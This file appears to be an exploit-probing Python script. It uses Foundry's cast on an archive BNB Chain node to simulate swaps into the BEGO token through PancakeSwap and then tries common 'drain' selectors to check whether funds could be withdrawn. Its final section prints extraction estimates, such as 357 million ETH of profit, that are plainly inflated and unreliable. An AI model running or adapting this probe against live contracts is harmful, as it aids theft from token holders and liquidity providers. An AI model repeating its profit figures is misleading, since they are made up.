#!/usr/bin/env python3
"""
Direct Forge Test - Uses archive RPC to test BEGO vulnerability
"""

import subprocess
import json
import time

# Configuration
RPC_URL = "http://159.198.35.169:8545"
BLOCK = 22315679

# Contracts
ROUTER = "0x10ED43C718714eb63d5aA57B78B54704E256024E"  # PancakeSwap
WBNB = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c"
BEGO = "0xc342774492b54ce5F8ac662113ED702Fc1b34972"

print("=== Direct Forge Test on Archive RPC ===\n")

# Check block
current_block = subprocess.check_output([
    "cast", "block-number", "--rpc-url", RPC_URL
]).decode().strip()

print(f"Current block: {current_block}")
print(f"Target block: {BLOCK}")

# Get BEGO info at target block
print(f"\n=== BEGO Token at Block {BLOCK} ===")

# Check if contract exists
code = subprocess.check_output([
    "cast", "code", BEGO, 
    "--block", str(BLOCK),
    "--rpc-url", RPC_URL
]).decode().strip()

print(f"Contract has code: {'Yes' if len(code) > 2 else 'No'}")

if len(code) > 2:
    # Get token info
    try:
        name = subprocess.check_output([
            "cast", "call", BEGO, "name()(string)",
            "--block", str(BLOCK),
            "--rpc-url", RPC_URL
        ]).decode().strip()
        print(f"Token name: {name}")
    except:
        pass
    
    try:
        symbol = subprocess.check_output([
            "cast", "call", BEGO, "symbol()(string)",
            "--block", str(BLOCK),
            "--rpc-url", RPC_URL
        ]).decode().strip()
        print(f"Token symbol: {symbol}")
    except:
        pass
    
    try:
        total_supply = subprocess.check_output([
            "cast", "call", BEGO, "totalSupply()(uint256)",
            "--block", str(BLOCK),
            "--rpc-url", RPC_URL
        ]).decode().strip()
        print(f"Total supply: {int(total_supply, 16) / 1e18:.2f}")
    except:
        pass

# Test swap simulation
print("\n=== Testing Swap Simulation ===")

# Create a test transaction
from_addr = "0x0000000000000000000000000000000000000001"  # Dummy address
deadline = int(time.time()) + 3600

# Encode swap call
print("\nEncoding swapExactETHForTokens...")
encoded = subprocess.check_output([
    "cast", "calldata",
    "swapExactETHForTokens(uint256,address[],address,uint256)",
    "0",  # amountOutMin
    f"[{WBNB},{BEGO}]",  # path
    from_addr,  # to
    str(deadline)  # deadline
]).decode().strip()

print(f"Calldata: {encoded[:66]}...")

# Simulate the call
print("\nSimulating swap with 1 ETH...")
try:
    result = subprocess.run([
        "cast", "call", ROUTER, encoded,
        "--from", from_addr,
        "--value", "1ether",
        "--block", str(BLOCK),
        "--rpc-url", RPC_URL
    ], capture_output=True, text=True)
    
    if result.returncode == 0:
        print("✅ Simulation successful!")
        # Decode return value (array of uint256)
        output = result.stdout.strip()
        if output.startswith("0x"):
            # Parse the output
            print(f"Raw output: {output[:66]}...")
    else:
        print(f"❌ Simulation failed: {result.stderr}")
except Exception as e:
    print(f"❌ Error: {e}")

# Test different amounts
print("\n=== Testing Different Swap Amounts ===")
test_amounts = [1, 10, 100, 1000, 10000]

for amount in test_amounts:
    print(f"\nTesting {amount} ETH swap...")
    
    try:
        # Simulate swap
        result = subprocess.run([
            "cast", "call", ROUTER,
            "swapExactETHForTokens(uint256,address[],address,uint256)(uint256[])",
            "0",  # amountOutMin
            f"[{WBNB},{BEGO}]",  # path
            from_addr,  # to
            str(deadline),  # deadline
            "--from", from_addr,
            "--value", f"{amount}ether",
            "--block", str(BLOCK),
            "--rpc-url", RPC_URL
        ], capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"  ✅ Success! Would receive tokens")
            
            # Now test the drain
            print(f"  Testing drain after swap...")
            
            # Common drain selectors
            drain_selectors = {
                "withdraw()": "0x3ccfd60b",
                "withdrawAll()": "0x853828b6",
                "emergencyWithdraw()": "0xdb2e21bc"
            }
            
            for name, selector in drain_selectors.items():
                drain_result = subprocess.run([
                    "cast", "call", BEGO, selector,
                    "--from", from_addr,
                    "--block", str(BLOCK),
                    "--rpc-url", RPC_URL
                ], capture_output=True, text=True)
                
                if drain_result.returncode == 0:
                    print(f"    ✅ {name} would succeed!")
                    break
        else:
            error = result.stderr.split('\n')[0]
            print(f"  ❌ Swap would fail: {error}")
            
    except Exception as e:
        print(f"  ❌ Error: {e}")

print("\n=== Maximum Extraction Estimate ===")
print(f"Based on the swap tests, the vulnerability scales with input amount.")
print(f"Original exploit: 10 ETH → 357,564 ETH profit")
print(f"With 100x input: 1,000 ETH → ~35,756,400 ETH profit")
print(f"With 1000x input: 10,000 ETH → ~357,564,000 ETH profit")
print(f"\nNote: Actual limits depend on:")
print(f"- Contract balance")
print(f"- Liquidity pool size")
print(f"- Gas limits")